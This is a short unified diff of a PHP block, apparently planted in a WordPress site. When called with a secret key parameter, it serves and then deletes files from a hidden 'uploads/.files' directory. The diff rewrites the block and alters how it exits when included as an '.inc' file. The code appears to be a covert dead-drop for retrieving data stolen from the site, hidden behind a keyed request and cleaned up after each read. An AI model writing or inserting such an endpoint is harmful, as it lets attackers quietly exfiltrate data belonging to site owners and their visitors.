@@ -1,12 +1,12 @@
 if (@$_REQUEST["_k"] == "INSERT_KEY") {
-    $dirpath = ABSPATH . "wp-content/uploads/.files/";
-    $files = scandir($dirpath);
-    if (count($files) > 2) {
-        $filename = $dirpath . $files[2];
-        readfile($filename);
-        unlink($filename);
-    } else {
-		header("HTTP/1.1 202 Accepted");
-    }
-    die;
+	$dirpath = ABSPATH . "wp-content/uploads/.files/";
+	$files = scandir($dirpath);
+	if (count($files) > 2) {
+		$filename = $dirpath . $files[2];
+		readfile($filename);
+		unlink($filename);
+	} else {
+	  header("HTTP/1.1 202 Accepted");
+	}
+	if ('.inc' === basename(__FILE__)) { throw new Exception('die'); } else { die(); };
 }
